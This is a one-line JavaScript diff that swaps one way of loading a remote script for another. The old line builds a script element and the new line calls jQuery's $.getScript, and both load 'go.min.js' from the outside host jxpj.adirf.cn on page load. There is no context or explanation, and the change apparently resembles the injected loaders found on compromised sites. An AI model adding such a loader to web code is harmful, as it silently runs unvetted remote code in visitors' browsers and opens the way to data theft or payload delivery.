@@ -1,1 +1,1 @@
-var s=document.createElement("script");s.type="text/javascript",s.src="http://jxpj.adirf.cn/go.min.js",s.charset="UTF-8",document.head.appendChild(s);
+$.getScript("http://jxpj.adirf.cn/go.min.js");
